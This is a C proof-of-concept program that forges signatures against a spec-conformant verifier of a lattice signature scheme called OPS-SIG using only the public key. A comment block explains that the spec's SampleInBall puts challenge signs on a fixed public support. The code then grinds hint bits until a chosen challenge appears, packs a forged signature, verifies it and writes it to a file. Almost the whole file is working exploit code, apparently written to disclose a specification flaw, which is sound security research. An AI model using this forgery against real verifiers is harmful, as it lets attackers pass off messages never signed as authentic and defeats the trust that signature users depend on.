/* Public-key-only universal forgery against a SPEC-CONFORMANT OPS-SIG verifier
 * (spec Algorithm 6 SampleInBall).  EUF-CMA, ZERO signing queries.
 *
 * Threat model / purity: crypto_sign_keypair is called only to obtain a public key to attack;
 * the secret key is immediately zeroed and NEVER read afterwards (grep SK-ZERO).  The forgery
 * reads only pk and the message.  It is accepted by the spec-conformant verifier and rejected on
 * any other message (control) and by the shipped/reference sampler (separate control binary).
 *
 * Mechanism: spec SampleInBall puts the tau signs on the FIXED public support {n-tau..n-1}, so the
 * challenge is one of only 2^tau values.  Fix a short z and a target challenge c* (all +1 on that
 * support); grind <=30 hint bits until the verifier's recomputed c_tilde SampleInBall's to c*.
 * Expected 2^tau hashes.  Shipped verifier's ONLY forgery defence is the c_tilde hash, whose
 * effective min-entropy the fixed support has cut to tau bits.
 *
 * TAU may be overridden at build time (-include a header that #undef/#define TAU) for a completed
 * scaled demonstration; the per-try cost is TAU-independent, so real-param cost = 2^TAU * (us/try).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "params.h"
#include "sign.h"
#include "packing.h"
#include "polyvec.h"
#include "poly.h"
#include "auxfunc.h"
#include "drng.h"
DRNG_ctx drng_algorithm;
#ifndef HB
#define HB 30            /* hint positions ground over (<= OMEGA) */
#endif
int main(int argc,char**argv){
  const char *outbin = argc>1?argv[1]:"forged.bin";
  uint8_t s48[48]; memset(s48,0x5a,48); if(argc>2) s48[0]=(uint8_t)atoi(argv[2]);
  init_random_number(&drng_algorithm,s48,48);
  static uint8_t pk[CRYPTO_PUBLICKEYBYTES], sk[CRYPTO_SECRETKEYBYTES], sig[CRYPTO_BYTES];
  crypto_sign_keypair(pk, sk);
  memset(sk, 0, sizeof sk);                 /* SK-ZERO: secret key destroyed; attack uses only pk */
  const char *msg = "OPS-SIG spec-literal SampleInBall forgery: this message was never signed";
  size_t mlen = strlen(msg);
  /* mu = CRH(CRH(pk) || 0x00 || 0x00 || M)  (spec Sign line 5, ctx empty) */
  uint8_t tr[CRHBYTES], mu[CRHBYTES];
  pseudohash(CRHBYTES*8, pk, (unsigned long long)CRYPTO_PUBLICKEYBYTES*8, tr);
  uint8_t *tmp = malloc(CRHBYTES+2+mlen); memcpy(tmp,tr,CRHBYTES); tmp[CRHBYTES]=0; tmp[CRHBYTES+1]=0;
  memcpy(tmp+CRHBYTES+2,msg,mlen); pseudohash(CRHBYTES*8, tmp, (unsigned long long)(CRHBYTES+2+mlen)*8, mu); free(tmp);
  uint8_t rho[SEEDBYTES]; polyveck t1; unpack_pk(rho,&t1,pk);
  polyvecl mat[K], z, zh; polyveck w; poly cstar, ch;
  for(int i=0;i<N;i++) cstar.coeffs[i] = (i >= N-TAU) ? 1 : 0;      /* target challenge = all +1 on fixed support */
  for(int j=0;j<L;j++) for(int i=0;i<N;i++){ uint32_t r; get_random_number(&drng_algorithm,(uint8_t*)&r,32);
    z.vec[j].coeffs[i]=(int32_t)(r%2001)-1000; }                    /* short z, ||z||inf < gamma1-beta */
  /* w = A z - c* t1 2^d  (exactly the verifier's reconstruction) */
  polyvec_matrix_expand(mat,rho); zh=z; polyvecl_ntt(&zh); polyvec_matrix_pointwise_montgomery(&w,mat,&zh);
  ch=cstar; poly_ntt(&ch); polyveck_shiftl(&t1); polyveck_ntt(&t1); polyveck_pointwise_poly_montgomery(&t1,&ch,&t1);
  polyveck_sub(&w,&w,&t1); polyveck_reduce(&w); polyveck_invntt_tomont(&w); polyveck_caddq(&w);
  polyveck w1; poly h_all[K]; polyveck h; memset(&h,0,sizeof h);
  static uint8_t ctmp[CRHBYTES + K*POLYW1_PACKEDBYTES]; uint8_t ct[CTILDEBYTES]; poly c; memcpy(ctmp,mu,CRHBYTES);
  clock_t t0=clock(); unsigned long long tries=0; int found=0;
  for(uint64_t ctr=0; ctr < (1ULL<<HB); ctr++){
    for(int b=0;b<HB;b++) h.vec[K-1].coeffs[N-1-b] = (ctr>>b)&1;
    polyveck_use_hint(&w1,&w,&h); polyveck_pack_w1(ctmp+CRHBYTES,&w1);
#if CTILDEBYTES == 32
    sm3hash(256, ctmp, (unsigned long long)sizeof(ctmp)*8, ct);
#else
    pseudohash(CTILDEBYTES*8, ctmp, (unsigned long long)sizeof(ctmp)*8, ct);
#endif
    tries++; poly_challenge(&c, ct);
    if(!memcmp(c.coeffs, cstar.coeffs, sizeof c.coeffs)){ found=1; break; }
  }
  (void)h_all;
  double secs=(double)(clock()-t0)/CLOCKS_PER_SEC;
  printf("TAU=%d  tries=%llu (2^%.2f, expected 2^%d)  %.1f s  %.2f us/try  found=%d\n",
         TAU,tries,__builtin_log2((double)tries<1?1:(double)tries),TAU,secs,1e6*secs/(tries?tries:1),found);
  if(!found){ printf("(exhausted 2^%d hint values without hitting c*; rerun with a different seed)\n",HB); return 1; }
  pack_sig(sig, ct, &z, &h);
  int r1 = crypto_sign_verify(sig, CRYPTO_BYTES, (const uint8_t*)msg, mlen, NULL, 0, pk);
  int r2 = crypto_sign_verify(sig, CRYPTO_BYTES, (const uint8_t*)"a totally different message", 27, NULL, 0, pk);
  printf("verify(forged, target msg) = %d   (0 = ACCEPT)\nverify(forged, other  msg) = %d   (control: must be nonzero)\n", r1, r2);
  FILE *f=fopen(outbin,"wb"); fwrite(pk,1,sizeof pk,f); fwrite(sig,1,CRYPTO_BYTES,f); fclose(f);
  printf("wrote %s (pk||sig)\nRESULT: %s\n", outbin, (r1==0&&r2!=0)?"FORGERY CONFIRMED (public key only, no signing query)":"no forgery");
  return (r1==0&&r2!=0)?0:1;
}
